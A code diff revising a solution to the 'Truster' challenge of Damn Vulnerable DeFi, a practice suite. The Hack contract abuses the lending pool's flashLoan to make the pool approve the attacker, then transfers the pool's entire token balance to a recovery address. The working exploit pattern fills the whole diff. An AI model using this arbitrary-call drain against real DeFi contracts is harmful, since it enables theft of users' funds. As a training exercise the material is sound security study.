@@ -51,7 +51,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        Hack hack = new Hack(token, pool, recovery);
+        Hack hack = new Hack(token, pool, recovery, TOKENS_IN_POOL);
     }
 
     /**
@@ -68,12 +68,9 @@ contract TrusterChallenge is Test {
 }
 
 contract Hack {
-    bytes i_data;
-    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
-
-    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) {
-        i_data = abi.encodeWithSelector(token.approve.selector, address(this), TOKENS_IN_POOL);
-        pool.flashLoan(0, address(pool), address(token), i_data);
+    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery, uint256 TOKENS_IN_POOL) {
+        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), TOKENS_IN_POOL);
+        pool.flashLoan(0, address(0), address(token), data);
         token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
     }
 }
